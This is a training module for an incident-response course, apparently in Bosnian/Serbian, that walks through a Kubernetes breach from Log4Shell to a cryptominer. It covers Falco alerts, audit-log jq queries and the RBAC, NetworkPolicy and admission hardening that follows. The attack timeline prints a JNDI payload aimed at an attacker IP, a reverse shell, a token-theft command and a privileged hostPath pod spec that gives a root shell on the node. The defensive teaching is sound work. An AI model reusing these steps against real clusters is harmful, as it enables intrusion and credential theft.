## Šta ovaj modul pokriva

Treći scenarij prati napad na Kubernetes klaster od ranjive biblioteke u javnoj aplikaciji do rudara kriptovaluta sa root pristupom na čvoru. Pokriva sva četiri cilja domena 3:

- **3.1** Runtime alarmi (**Falco**) i ulazna tačka: ranjiva slika (**Trivy**) i aplikacija.
- **3.2** **Kubernetes audit log**: zloupotreba ServiceAccount tokena, `exec`, privilegovani podovi.
- **3.3** **RBAC** i konfiguracija koja je omogućila napad.
- **3.4** Obuzdavanje (**NetworkPolicy**, izolacija, rotacija), hardening i izvještaj.

Poslije modula znaš:

- kako iz gomile Falco alarma izdvojiti „pacijenta nula“ i prvi trenutak kompromitacije;
- kako u audit logu pratiti jedan ukradeni token, i po čemu se razlikuje od legitimne upotrebe istog ServiceAccounta;
- zašto je `create pods` u cijelom klasteru praktično isto što i root na svakom čvoru;
- šta prvo obuzdati, šta rotirati i kako napisati RBAC, NetworkPolicy i `securityContext` koji bi napad zaustavili.

Alati su isti kao u CKS kursu i kursu Detekcija i odgovor: Falco, Trivy, audit log, `jq` i `yq`. Novo je to što ih koristiš zajedno, pod pritiskom, nad jednim incidentom.

## Priča

**Shop d.o.o.** prodaje opremu preko web prodavnice. Sve radi u jednom Kubernetes klasteru (v1.35, Calico, tri radna čvora `node01`–`node03`, kontrolna ravan `cp01` na `10.0.10.10`):

| Namespace | Šta radi |
|---|---|
| `shop` | `storefront` (Java/Spring, javno iza `ingress-nginx`), `newsletter`, `postgres` |
| `payments` | `payments-api`, veza sa procesorom plaćanja |
| `monitoring`, `argocd`, `ops`, `ci` | Prometheus, GitOps, CronJob `cert-checker`, GitLab runneri |

Ljudi u priči:

- **Ivana** (SOC, dežurna) dobija Falco alarm i vodi istragu,
- **Marko** (tim `shop`) je vlasnik `storefront` aplikacije,
- **Ana** (`payments-ops`) radi planirano održavanje u `payments` te noći,
- **Nikola** (platform tim) je vlasnik RBAC-a i čvorova; on je incident commander.

Pozadina, kakva postoji u mnogim firmama: slika `storefront:2.3.1` izgrađena je 2021. i nikad nije ponovo skenirana; `log4j-core` je ostao na 2.14.1. U martu 2025. aplikacija je dobila „čitanje ConfigMapa preko API-ja“, a neko je, da bi „radilo odmah“, ServiceAccountu `storefront` dodijelio kopiju ops uloge preko **ClusterRoleBindinga**. Namespace nema NetworkPolicy, kontejner radi kao root, token je automatski montiran.

### Napad, minut po minut (21. 10. 2026, UTC)

| Vrijeme | Šta se desilo | Izvor dokaza |
|---|---|---|
| 02:13:06 | HTTP zahtjev sa `${jndi:ldap://203.0.113.189:1389/a}` u zaglavlju; `java` se povezuje na napadačev LDAP | Falco *Unexpected outbound connection* |
| 02:13:07 | Učitana klasa pokreće reverzni shell prema `203.0.113.189:4444` | Falco *Redirect STDOUT/STDIN to Network Connection* |
| 02:14:12 | `python3 -c 'import pty; pty.spawn("/bin/bash")'`: shell sa terminalom | Falco *Terminal shell in container* |
| 02:14:40 | `cat /var/run/secrets/kubernetes.io/serviceaccount/token` | Falco (lokalno pravilo) *Read ServiceAccount token* |
| 02:15:01 | `curl` sa tokenom prema `https://10.96.0.1`: lista podova u `shop` | Falco + audit |
| 02:16:22–40 | Preuzima `kubectl` u `/tmp`, pokreće `kubectl auth can-i --list` | Falco *Drop and execute new binary* + audit |
| 02:16:58–02:17:52 | `list secrets` u `shop`, `get` tri tajne (jedna u `payments`) | audit |
| 02:18:05–21 | `list nodes` i pravljenje ClusterRoleBindinga: oba **403** | audit |
| 02:19:12 | Pravi privilegovani pod `kube-system/node-debug-7f4c` na `node01` sa `hostPath: /` | audit (`requestObject`) + Falco *Launch Privileged Container* |
| 02:19:47 | `kubectl exec` u taj pod, `chroot /host` | audit (`pods/exec`, 101) + Falco shell |
| 02:20:02–31 | Čita `/etc/shadow` čvora, dodaje root crontab | Falco *Read sensitive file untrusted*, *Schedule Cron Jobs* |
| 02:21:09 | Rudar `kswapd0` se povezuje na pool `198.51.100.142:3333` | Falco *Detect crypto miners using the Stratum protocol* |

Ivana dobija alarm u 02:21. Napadač je u klasteru osam minuta, a sve što je uradio vidi se u dva izvora: Falco (šta se dešavalo **u** kontejnerima i na čvorovima) i audit log (šta je traženo **od** API servera).

## Lanac napada i MITRE ATT&CK

| Korak | Taktika | Tehnika |
|---|---|---|
| Log4Shell u javnoj aplikaciji | Initial Access | T1190 Exploit Public-Facing Application |
| Reverzni shell, bash | Execution | T1059.004 Unix Shell |
| Preuzet `kubectl` | Command and Control | T1105 Ingress Tool Transfer |
| Čitanje tokena iz `/var/run/secrets/...` | Credential Access | T1528 Steal Application Access Token, T1552.007 Container API |
| `auth can-i --list`, `list pods/namespaces` | Discovery | T1613 Container and Resource Discovery |
| `get secrets` | Credential Access | T1552.007 Unsecured Credentials: Container API |
| Privilegovani pod u `kube-system` | Execution, Privilege Escalation | T1610 Deploy Container, T1611 Escape to Host |
| `kubectl exec` | Execution | T1609 Container Administration Command |
| `/etc/shadow` na čvoru | Credential Access | T1003.008 /etc/passwd and /etc/shadow |
| Root crontab na čvoru | Persistence | T1053.003 Cron |
| Ime `kswapd0`, pod nazvan `node-debug` u `kube-system` | Defense Evasion | T1036.004/.005 Masquerading |
| Rudar | Impact | T1496 Resource Hijacking |

Microsoftova **Threat Matrix for Kubernetes** ima iste korake pod imenima „Exposed sensitive interfaces / Application exploit“, „Access container service account“, „List K8s secrets“, „Privileged container“, „Writable hostPath mount“. ATT&CK Containers matrica i ona se dopunjuju; za izvještaj koristi ATT&CK, jer ga razumije i ostatak SOC-a.

## Faza 1: Falco alarmi i pacijent nula (3.1)

Falco izvozi alarme kao JSON (stdout, fajl ili Falcosidekick). Svaki alarm ima `time`, `rule`, `priority`, `hostname`, `tags` i `output_fields` sa Kubernetes kontekstom:

```bash
F=falco-alerts.jsonl
jq -r '[.time, .hostname, .priority, .rule, .output_fields."k8s.ns.name", .output_fields."k8s.pod.name"] | @tsv' $F
jq -r '.rule' $F | sort | uniq -c | sort -rn          # koja pravila najviše pucaju
jq -r 'select(.priority=="Critical") | [.time, .rule, .output_fields."k8s.pod.name"] | @tsv' $F
```

Alarm koji je probudio dežurnog (rudar na `node01`) je **posljedica**. Pacijent nula je pod u kome se prvi put pojavljuje izvršavanje koda koje ne pripada aplikaciji. Grupisanje po podu pokazuje lanac:

```bash
jq -r '.output_fields."k8s.pod.name"' $F | sort | uniq -c | sort -rn
jq -r 'select(.output_fields."k8s.pod.name"=="storefront-7d9c6b5f4-x2kqp")
  | [.time, .rule, (.output_fields."fd.name" // .output_fields."proc.cmdline")] | @tsv' $F
```

Kako čitati pojedine alarme:

| Pravilo | Šta znači ovdje | Lažno pozitivno kad |
|---|---|---|
| *Unexpected outbound connection* (lokalno, sa allowlistom) | `java` otvara vezu prema `:1389`: tipičan JNDI/LDAP callback | Nova SaaS integracija koja nije u allowlisti (vidi `newsletter` u 01:38) |
| *Redirect STDOUT/STDIN to Network Connection in Container* | `dup2` stdin/stdout na socket: reverzni shell | Rijetko; neki debug alati |
| *Terminal shell in container* | Shell sa TTY-jem (`proc.tty != 0`) | `kubectl exec -it` administratora (Ana u `payments`) |
| *Read ServiceAccount token* (lokalno) | Proces van allowliste čita token | Sidecar ili agent koji ga legitimno čita |
| *Contact K8S API Server From Container* | Kontejner koji inače ne priča sa API-jem to sada radi | Operatori i CronJobovi (`cert-checker`) |
| *Drop and execute new binary in container* | Izvršava se fajl koga nema u slici (upper layer) | CI runneri koji grade i pokreću binarne fajlove |
| *Launch Privileged Container* | Pokrenut kontejner sa `privileged: true` | CNI, CSI i agenti za nadzor u `kube-system` |
| *Detect crypto miners using the Stratum protocol* | `stratum+tcp://` u komandnoj liniji | Gotovo nikad |

Dva alarma **nisu** dio napada, i to treba zapisati: shell u `payments` u 01:55 poklapa se sa Aninim `kubectl exec` u audit logu (korisnik `oidc:ana.jovanovic@shop.local`, planirano održavanje), a `ci` i `ops` alarmi se ponavljaju svaki dan. Odbacivanje šuma uvijek potvrdi drugim izvorom, ne pretpostavkom.

`hostname` u alarmu je čvor. Pacijent nula je na `node02`, a rudar na `node01`: napadač je prešao sa čvora na čvor kroz API server, ne kroz mrežu. To je prvi trag da je problem RBAC, ne samo ranjiva aplikacija.

## Ulazna tačka: ranjiva slika (3.1)

Falco kaže **da** je `java` pokrenuo shell, ali ne **kako**. Spoji ga sa slikom iz Deploymenta i Trivy izvještajem:

```bash
yq '.spec.template.spec.containers[].image' storefront-deployment.yaml
T=trivy-storefront-2.3.1.json
jq -r '.Results[] | .Target as $t | .Vulnerabilities[]? | [$t, .VulnerabilityID, .PkgName, .InstalledVersion, .FixedVersion, .Status, .Severity, .CVSS.nvd.V3Score] | @tsv' $T
jq '.Metadata.ImageConfig.config.User // "nije postavljen (root)"' $T
```

| Nalaz | Ocjena | Odgovara dokazima? |
|---|---|---|
| CVE-2021-44228 (Log4Shell), `log4j-core` 2.14.1 | CRITICAL, 10.0, u CISA KEV | Da: `java` se povezuje na LDAP port 1389, pa pokreće `sh` |
| CVE-2021-45046, -45105, -44832 | 9.0, 5.9, 6.6 | Ista biblioteka; ispravka svih traži 2.17.1 |
| CVE-2023-45853, `zlib1g` | CRITICAL, 9.8, `will_not_fix` | Ne: ranjiv je MiniZip, koji aplikacija ne koristi; Debian ga ne ispravlja |
| `jackson-databind` CVE-2022-42003/42004 | HIGH, DoS | Ne vodi do izvršavanja koda |

Log4Shell radi ovako: Log4j 2 do 2.14.1 razrješava *lookups* u porukama koje loguje. Ako aplikacija loguje `User-Agent`, string `${jndi:ldap://napadac/a}` natjera JVM da preko JNDI kontaktira LDAP server napadača, koji vraća referencu na Java klasu; klasa se učita i izvrši sa pravima aplikacije. Zato je prvi Falco alarm **izlazna** veza iz `java` procesa, a ne dolazni saobraćaj.

Prioritet nije samo CVSS. Pitanja iz kursa CySA+: da li je ranjivost u KEV katalogu (aktivno se iskorištava), da li je dostižna (javni endpoint, ranjiva funkcija se koristi), ima li ispravku. `zlib1g` je CRITICAL po papiru, ali nije dostižan; Log4Shell je dostižan sa interneta bez autentikacije.

U Trivy izvještaju je još jedan nalaz koji nije CVE: `ImageConfig` nema `User`, pa kontejner radi kao **root**. To nije omogućilo ulaz, ali je napadaču olakšalo sve poslije njega.

## Faza 2: audit log i ukradeni token (3.2)

Falco vidi `curl` i `kubectl` prema `10.96.0.1:443`. Audit log kaže šta su tražili. Svaki zapis ima ko (`user`), odakle (`sourceIPs`, `userAgent`), šta (`verb`, `objectRef`, `requestURI`), ishod (`responseStatus.code`) i zašto je dozvoljeno (`annotations`):

```json
{"level":"Metadata","stage":"ResponseComplete","verb":"get",
 "requestURI":"/api/v1/namespaces/payments/secrets/payments-db",
 "user":{"username":"system:serviceaccount:shop:storefront",
   "extra":{"authentication.kubernetes.io/pod-name":["storefront-7d9c6b5f4-x2kqp"],
            "authentication.kubernetes.io/node-name":["node02"],
            "authentication.kubernetes.io/credential-id":["JTI=…"]}},
 "sourceIPs":["10.244.2.17"],"userAgent":"kubectl/v1.29.3 (linux/amd64) kubernetes/6813625",
 "objectRef":{"resource":"secrets","namespace":"payments","name":"payments-db"},
 "responseStatus":{"code":200},
 "annotations":{"authorization.k8s.io/decision":"allow",
   "authorization.k8s.io/reason":"RBAC: allowed by ClusterRoleBinding \"storefront-ops\" of ClusterRole \"storefront-ops\" to ServiceAccount \"storefront/shop\""}}
```

Tri polja su ključna za tokene:

- `user.extra` kod **bound** ServiceAccount tokena (podrazumijevano od v1.24) nosi ime i UID poda i čvora za koje je token izdat, i `credential-id` (JTI). Ako se token koristi sa IP adrese koja nije IP tog poda, ukraden je i iznesen van klastera.
- `userAgent` odvaja aplikaciju (`fabric8-kubernetes-client`) od napadača (`curl`, `kubectl/v1.29.3`). Lako se lažira, ali promjena u odnosu na uobičajeno je jak signal.
- `authorization.k8s.io/reason` imenuje tačno onaj binding koji je dozvolio zahtjev. Ne moraš pogađati koji od desetina bindinga je problem.

Upiti, od šireg ka užem:

```bash
A=audit.log
SA=system:serviceaccount:shop:storefront
jq -r '.user.username' $A | sort | uniq -c | sort -rn | head                 # ko najviše priča
jq -r --arg sa $SA 'select(.user.username==$sa) | .userAgent' $A | sort | uniq -c
jq -r --arg sa $SA 'select(.user.username==$sa and (.userAgent|startswith("fabric8")|not))
  | [.requestReceivedTimestamp, .verb, .objectRef.resource, .objectRef.subresource,
     .objectRef.namespace, .objectRef.name, .responseStatus.code] | @tsv' $A
# token korišten sa IP adrese koja nije IP poda iz tokena
jq -r 'select(.user.extra."authentication.kubernetes.io/pod-name") | [.user.extra."authentication.kubernetes.io/pod-name"[0], .sourceIPs[0]] | @tsv' $A | sort -u
```

Šta čitaš iz napadačevih zahtjeva:

- **`create selfsubjectrulesreviews`** je `kubectl auth can-i --list`: napadač pita API šta smije. To aplikacija nikad ne radi, pa je dobar signal za detekciju.
- **`list secrets`** u `shop` vraća **sadržaj** svih tajni u namespaceu, ne samo imena. Zato su za rotaciju sve tajne iz `shop` (`registry-pull`, `shop-tls` takođe), iako ih napadač nije tražio po imenu. `get` na `postgres-credentials`, `stripe-api-key` i `payments/payments-db` su ono što je ciljano čitao.
- **403** na `list nodes` i `create clusterrolebindings` znači da je napadač pokušao širenje i perzistenciju na nivou klastera i da RBAC tu jeste zaustavio. Neuspjeli zahtjevi su dokaz namjere i spadaju u vremensku liniju.
- **`create pods`** u `kube-system`: audit politika bilježi podove na nivou `Request`, pa je cio manifest u `requestObject`.
- **`create pods/exec`** sa kodom **101** (Switching Protocols) je uspješan interaktivni `exec`. Noviji `kubectl` koristi WebSocket i taj zahtjev može biti zabilježen kao `get`; zato filtriraj po `objectRef.subresource=="exec"`, ne po glagolu.

### Privilegovani pod

```bash
jq 'select(.verb=="create" and .objectRef.resource=="pods" and .objectRef.subresource==null
      and ([.requestObject.spec.containers[]?.securityContext.privileged] | any)) | .requestObject.spec' $A
```

```yaml
spec:
  nodeName: node01            # zaobilazi scheduler: nema pods/binding od kube-schedulera
  hostPID: true               # vidi i signalizira procese čvora
  hostNetwork: true           # mrežni stack čvora, zaobilazi NetworkPolicy
  tolerations: [{operator: Exists}]
  containers:
    - image: docker.io/library/alpine:3.20
      securityContext: {privileged: true}   # svi uređaji, sve capabilities, bez seccompa/AppArmora
      volumeMounts: [{name: host, mountPath: /host}]
  volumes:
    - name: host
      hostPath: {path: /}     # cio fajl sistem čvora, read-write
```

`privileged` + `hostPath: /` + `chroot /host` je root shell na čvoru. Odatle napadač čita `/etc/shadow`, kubelet kredencijale (`/var/lib/kubelet/pki`), tokene svih podova na tom čvoru (`/var/lib/kubelet/pods/*/volumes/kubernetes.io~projected/`) i dodaje cron. Ime `node-debug` i namespace `kube-system` biraju se da liče na alat administratora, a `kube-system` obično nema Pod Security enforce labelu, pa ga admission ne blokira.

## Faza 3: RBAC i konfiguracija koja je to omogućila (3.3)

```yaml
kind: ClusterRole
metadata: {name: storefront-ops}
rules:
  - apiGroups: [""]
    resources: ["pods", "pods/log", "pods/exec", "services", "configmaps", "secrets", "namespaces"]
    verbs: ["get", "list", "watch", "create", "delete"]
---
kind: ClusterRoleBinding        # važi u SVIM namespaceovima
metadata: {name: storefront-ops}
subjects: [{kind: ServiceAccount, name: storefront, namespace: shop}]
roleRef: {kind: ClusterRole, name: storefront-ops}
```

Šta je ovdje opasno, redom po težini:

| Dozvola | Zašto je opasna |
|---|---|
| `create pods` kroz ClusterRoleBinding | Pod u bilo kom namespaceu, uz bilo koji ServiceAccount tog namespacea i bilo koji `securityContext` koji admission pusti. U namespaceu bez Pod Security zaštite to je root na čvoru |
| `get/list secrets` kroz ClusterRoleBinding | Sve tajne klastera, uključujući tuđe namespaceove (`payments`) |
| `create pods/exec` | Shell u bilo kom podu, uključujući podove sa jačim ServiceAccountima |
| ClusterRoleBinding umjesto RoleBindinga | Ista ClusterRole kroz RoleBinding u `shop` bi ograničila štetu na `shop` |
| `namespaces` list | Mapa klastera za napadača |

Aplikaciji je trebalo samo `get` na `configmaps/storefront-config`, i to se vidi u audit logu (svi `fabric8` zahtjevi). Princip: dozvole se izvode iz stvarne upotrebe, ne iz „šta bi moglo zatrebati“.

```bash
jq -r 'select(.userAgent|startswith("fabric8")) | [.verb, .objectRef.resource, .objectRef.name] | @tsv' $A | sort | uniq -c
yq 'select(.kind=="ClusterRoleBinding") | [.metadata.name, .roleRef.name, (.subjects[] | .kind + "/" + (.namespace // "") + "/" + .name)]' rbac.yaml
```

Ostali propusti u konfiguraciji, koji nisu sami omogućili napad ali su ga olakšali:

- **automatski montiran token** u kontejner koji je javno izložen; podrazumijevani token koji ubaci admission produžava se do godinu dana (`--service-account-extend-token-expiration`), dok eksplicitni `projected` token sa `expirationSeconds: 600` ističe za 10 minuta,
- **nema NetworkPolicy**: `java` je smio na `203.0.113.189:1389`, a rudar na pool,
- **root u kontejneru** i upisiv root fajl sistem: `python3`, `curl` i `/tmp/kubectl` su radili bez prepreke,
- **`kube-system` bez Pod Security** ograničenja, i nikakva admission politika koja zabranjuje `privileged` i `hostPath` van liste dozvoljenih podova.

## Tačke odluke: šta prvo

Ivana i Nikola u 02:30 imaju aktivnog napadača sa tokenom, root na `node01` i rudara. Redoslijed:

| # | Odluka | Zašto baš tada |
|---|---|---|
| 1 | Sačuvati dokaze: izvoz audit loga i Falco alarma, `kubectl get pod -o yaml`, logovi podova | Brisanje poda briše i dio dokaza; izvoz traje minut |
| 2 | Obrisati ClusterRoleBinding `storefront-ops` | Odmah gasi sve što napadač radi tokenom, u cijelom klasteru; aplikacija gubi samo čitanje ConfigMapa |
| 3 | Mrežno izolovati `node01` i `storefront` pod (NetworkPolicy, firewall čvora) i blokirati `203.0.113.189` i `198.51.100.142` na izlazu | Prekida C2 i rudara bez gubitka dokaza na disku |
| 4 | `cordon` `node01`, snapshot diska, pa obrisati `node-debug-7f4c` | Napadač ima root na čvoru; čvor se više ne smatra čistim |
| 5 | Izolovati pa obrisati pod `x2kqp` | Bound token tog poda prestaje da važi kad se pod obriše |
| 6 | Rotirati tajne i kredencijale čvora | Napadač ih ima; rotacija tek kad je pristup prekinut, inače ukrade nove |

Zašto ne odmah `kubectl delete pod`: to bi poništilo token, ali bi napadač i dalje imao root na `node01` (cron, i možda kubelet kredencijal), a izgubio bi se sadržaj `/tmp` iz kontejnera. Zašto ne odmah rotacija: dok napadač ima token sa `get secrets`, pročitaće i nove vrijednosti.

## Obuzdavanje, iskorjenjivanje, oporavak (3.4)

Obuzdavanje (komande za pravi klaster; u labu radiš nad manifestima):

```bash
kubectl delete clusterrolebinding storefront-ops
kubectl -n shop label pod storefront-7d9c6b5f4-x2kqp app- quarantine=true   # izlazi iz ReplicaSeta i Servicea
kubectl apply -f quarantine-deny-all.yaml                                    # NetworkPolicy za quarantine=true
kubectl apply -f networkpolicy.yaml                                          # default-deny + allow za shop
kubectl cordon node01
kubectl -n kube-system get pod node-debug-7f4c -o yaml > dokazi/node-debug-7f4c.yaml
kubectl -n kube-system delete pod node-debug-7f4c
```

NetworkPolicy za namespace (skraćeno; puna verzija je u labu):

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata: {name: default-deny, namespace: shop}
spec:
  podSelector: {}
  policyTypes: ["Ingress", "Egress"]
---
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata: {name: storefront, namespace: shop}
spec:
  podSelector: {matchLabels: {app: storefront}}
  policyTypes: ["Ingress", "Egress"]
  ingress:
    - from: [{namespaceSelector: {matchLabels: {kubernetes.io/metadata.name: ingress-nginx}}}]
      ports: [{protocol: TCP, port: 8080}]
  egress:
    - to: [{podSelector: {matchLabels: {app: postgres}}}]
      ports: [{protocol: TCP, port: 5432}]
    - to: [{namespaceSelector: {matchLabels: {kubernetes.io/metadata.name: kube-system}}, podSelector: {matchLabels: {k8s-app: kube-dns}}}]
      ports: [{protocol: UDP, port: 53}, {protocol: TCP, port: 53}]
    - to: [{ipBlock: {cidr: 10.0.10.10/32}}]       # API server poslije DNAT-a 10.96.0.1:443
      ports: [{protocol: TCP, port: 6443}]
```

NetworkPolicy ne bi spriječila zloupotrebu tokena: API server mora ostati dostupan aplikaciji. Ona prekida LDAP callback (ulaz), reverzni shell, preuzimanje `kubectl`-a i rudara. Token rješava RBAC. Pod sa `hostNetwork: true` NetworkPolicy uopšte ne pokriva, što je još jedan razlog da se takvi podovi blokiraju na admissionu.

Iskorjenjivanje:

- **`node01` se ponovo gradi** iz čiste slike (drain, izbaciti iz klastera, novi čvor). Napadač je imao root na hostu; čišćenje crona nije dovoljno.
- Provjeriti ostale čvorove i podove na `node01` u periodu 02:19–02:30: tokeni tih podova bili su čitljivi kroz `hostPath`.
- Rotirati kubelet kredencijal `node01` (dolazi sa novim čvorom) i `bootstrap-token` ako je bio čitljiv.
- Ukloniti sliku `storefront:2.3.1` iz registryja ili je označiti kao blokiranu.

Rotacija (sve što je napadač mogao pročitati):

| Šta | Zašto |
|---|---|
| `shop/postgres-credentials`, `shop/stripe-api-key`, `payments/payments-db` | Pojedinačno pročitane (`get`) |
| `shop/registry-pull`, `shop/shop-tls` | Vraćene kroz `list secrets` u `shop` |
| ServiceAccount token `storefront` | Prestaje da važi brisanjem poda; potvrdi u audit logu da ga nema poslije |
| Lozinke iz `/etc/shadow` čvora, SSH ključevi čvora | Čitao je `/etc/shadow` kao root |
| Stripe ključ i u Stripe-u | Provjeri u Stripe logovima ima li upotrebe sa nepoznatih IP adresa |

Oporavak i hardening: `storefront:2.4.0` sa `log4j-core` 2.17.1, novi `securityContext` i Role sa najmanjim privilegijama.

```yaml
spec:
  template:
    spec:
      serviceAccountName: storefront
      automountServiceAccountToken: false     # token samo eksplicitno, kratkog vijeka
      securityContext:
        runAsNonRoot: true
        runAsUser: 10001
        seccompProfile: {type: RuntimeDefault}
      containers:
        - name: storefront
          image: registry.shop.local/shop/storefront:2.4.0
          securityContext:
            allowPrivilegeEscalation: false
            readOnlyRootFilesystem: true      # nema /tmp/kubectl ni /tmp/.x/kswapd0 van emptyDir-a
            capabilities: {drop: ["ALL"]}
          volumeMounts:
            - {name: tmp, mountPath: /tmp}
            - {name: sa-token, mountPath: /var/run/secrets/kubernetes.io/serviceaccount, readOnly: true}
      volumes:
        - {name: tmp, emptyDir: {sizeLimit: 256Mi}}
        - name: sa-token
          projected:
            sources:
              - serviceAccountToken: {path: token, expirationSeconds: 600}
              - configMap: {name: kube-root-ca.crt, items: [{key: ca.crt, path: ca.crt}]}
              - downwardAPI: {items: [{path: namespace, fieldRef: {fieldPath: metadata.namespace}}]}
```

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata: {name: storefront-config-reader, namespace: shop}
rules:
  - apiGroups: [""]
    resources: ["configmaps"]
    resourceNames: ["storefront-config"]
    verbs: ["get"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata: {name: storefront-config-reader, namespace: shop}
subjects: [{kind: ServiceAccount, name: storefront, namespace: shop}]
roleRef: {apiGroup: rbac.authorization.k8s.io, kind: Role, name: storefront-config-reader}
```

Čak i da napadač ponovo dobije shell, sa ovim tokenom može da pročita samo jedan ConfigMap, ne može da piše po fajl sistemu van `/tmp`, nije root i ne može nigdje osim na bazu, DNS i API.

## Detekcije koje bi ranije uhvatile napad

| Kontrola | Gdje bi zaustavila ili uhvatila | Vrsta |
|---|---|---|
| Trivy gate u CI-u: blokiraj CRITICAL sa ispravkom ili iz KEV kataloga | Slika 2.3.1 ne bi prošla redovno ponovno skeniranje | Preventivna |
| Egress NetworkPolicy (default-deny) | LDAP callback u 02:13:06 ne bi uspio: nema ulaza | Preventivna |
| Falco: shell ili `curl`/`wget` u `storefront` → automatski odgovor (Falcosidekick + Talon: izolacija poda) | 02:14, četiri minuta prije tajni | Detektivna + odgovor |
| Falco pravilo za čitanje tokena (ispod) | 02:14:40 | Detektivna |
| Audit alarm: `selfsubjectrulesreviews` ili `secrets` od ServiceAccounta aplikacije | 02:16:41 | Detektivna |
| Audit alarm: token korišten sa IP adrese koja nije IP poda | Odmah, ako se token iznese | Detektivna |
| Pod Security Admission `restricted` na aplikacijskim namespaceovima, `ValidatingAdmissionPolicy` protiv `privileged`/`hostPath` svuda | 02:19:12: pod bi bio odbijen | Preventivna |
| Periodični pregled ClusterRoleBindinga prema ServiceAccountima aplikacija | Mjesecima prije napada | Preventivna |

Falco pravilo za čitanje tokena (lokalno pravilo iz ovog scenarija):

```yaml
- list: sa_token_readers
  items: [java, fluent-bit, vault-agent]
- rule: Read ServiceAccount token
  desc: Proces van allowliste čita ServiceAccount token u kontejneru
  condition: >
    open_read and container
    and fd.name startswith /var/run/secrets/kubernetes.io/serviceaccount/
    and fd.name endswith /token
    and not proc.name in (sa_token_readers)
  output: ServiceAccount token read by unexpected process (file=%fd.name proc=%proc.name cmdline=%proc.cmdline k8s_pod=%k8s.pod.name)
  priority: WARNING
  tags: [container, k8s, mitre_credential_access, T1528]
```

Audit detekcija za privilegovane podove (jq sada, ista logika kao Sigma ili KQL pravilo u SIEM-u):

```bash
jq -c 'select(.verb=="create" and .objectRef.resource=="pods" and .objectRef.subresource==null and .responseStatus.code==201)
  | select([.requestObject.spec.containers[]?.securityContext.privileged] | any
           or .requestObject.spec.hostPID == true
           or ([.requestObject.spec.volumes[]?.hostPath.path] | index("/")))
  | {t: .requestReceivedTimestamp, who: .user.username, ns: .objectRef.namespace, pod: .objectRef.name}' audit.log
```

Admission politika koja bi odbila `node-debug-7f4c` (CEL, `ValidatingAdmissionPolicy`, GA od v1.30; uz nju ide `ValidatingAdmissionPolicyBinding` sa izuzecima za CNI i agente):

```yaml
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingAdmissionPolicy
metadata: {name: no-privileged-no-hostpath}
spec:
  matchConstraints:
    resourceRules: [{apiGroups: [""], apiVersions: ["v1"], operations: ["CREATE", "UPDATE"], resources: ["pods"]}]
  validations:
    - expression: "!object.spec.containers.exists(c, has(c.securityContext) && has(c.securityContext.privileged) && c.securityContext.privileged)"
      message: "privilegovani kontejneri nisu dozvoljeni"
    - expression: "!has(object.spec.volumes) || !object.spec.volumes.exists(v, has(v.hostPath))"
      message: "hostPath volumeni nisu dozvoljeni"
```

## Izvještaj

Struktura je ista kao u ostalim scenarijima, uz specifičnosti Kubernetesa:

1. **Sažetak** (tri rečenice za menadžment): Log4Shell u prodavnici, preširoka RBAC prava, root na jednom čvoru, rudar; tajne za bazu i plaćanja su procurile i rotirane.
2. **Vremenska linija** u UTC, iz oba izvora, sa izvorom uz svaki red.
3. **Uzrok**: tehnički (CVE, root u kontejneru) i organizacioni (ClusterRoleBinding „privremeno“ od 2025, slika bez ponovnog skeniranja).
4. **Obim**: koji namespaceovi, tajne, čvorovi; šta **nije** pogođeno i kako to znaš (403 na `nodes` i `clusterrolebindings`, nema upotrebe tokena van poda).
5. **Obuzdavanje, iskorjenjivanje, oporavak** sa vremenima.
6. **Preporuke** sa vlasnikom i rokom.

Metrike: MTTD je vrijeme od 02:13:06 do alarma koji je neko pogledao (02:21, oko 8 minuta, ali tek kad je rudar već radio); pravo pitanje za lekcije je zašto alarmi u 02:13 i 02:14 nisu probudili nikoga. Odgovor je obično prioritet (*Notice*) i šum: pravilo *Terminal shell in container* puca i na legitimne `kubectl exec`.

## Veze sa drugim kursevima

- [CKS: RBAC i ServiceAccount](#/05-cks/m/03-rbac-i-serviceaccount): Role vs ClusterRole, bound tokeni, `automountServiceAccountToken`.
- [CKS: Audit logovi](#/05-cks/m/11-audit-logovi): audit politika, nivoi `Metadata`/`Request`/`RequestResponse`, stage-ovi.
- [CKS: Runtime security](#/05-cks/m/12-runtime-security): Falco pravila, makroi i output polja.
- [CKS: NetworkPolicy i CIS](#/05-cks/m/01-networkpolicy-i-cis): default-deny i egress pravila.
- [CKS: Pod Security i Secrets](#/05-cks/m/07-pod-security-i-secrets): Pod Security Admission, `securityContext`.
- [CKS: Slike i statička analiza](#/05-cks/m/09-slike-i-staticka-analiza): Trivy nad slikama.
- [CKA: RBAC i pristup](#/04-cka/m/04-rbac-i-pristup) i [CKA: Network Policy](#/04-cka/m/09-network-policy): osnove.
- [Detekcija i odgovor: Cloud i Kubernetes logovi](#/07-detekcija-i-odgovor/m/02-cloud-i-kubernetes-logovi): istraga audit loga sa `jq`.
- [Detekcija i odgovor: Falco](#/07-detekcija-i-odgovor/m/07-falco) i [Obuzdavanje i runbookovi](#/07-detekcija-i-odgovor/m/10-obuzdavanje-i-runbookovi): izolacija poda.
- [DevSecOps: Kontejneri](#/06-devsecops/m/08-kontejneri) i [SCA i zavisnosti](#/06-devsecops/m/06-sca-i-zavisnosti): skeniranje i gate u CI-u.
- [CySA+: Analiza i prioritizacija](#/09-cysa/m/07-analiza-i-prioritizacija): KEV, dostižnost i CVSS.
- [Sigurnosni temelji: MITRE ATT&CK](#/01-sigurnosni-temelji/m/06-mitre-attack): mapiranje tehnika.
